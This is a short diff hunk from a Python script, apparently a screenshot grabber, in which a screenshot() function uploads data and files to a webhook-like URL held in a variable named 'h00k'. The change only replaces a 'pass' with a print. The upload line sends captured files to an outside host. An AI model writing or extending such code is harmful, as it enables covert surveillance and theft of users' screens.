@@ -49,6 +49,6 @@ def screenshot():
         response3 = requests.post(h00k, data=data, files=files)
     
     if response3.status_code == 204:
-        pass
+        print ("Check it %temp%")
     else:
         pass
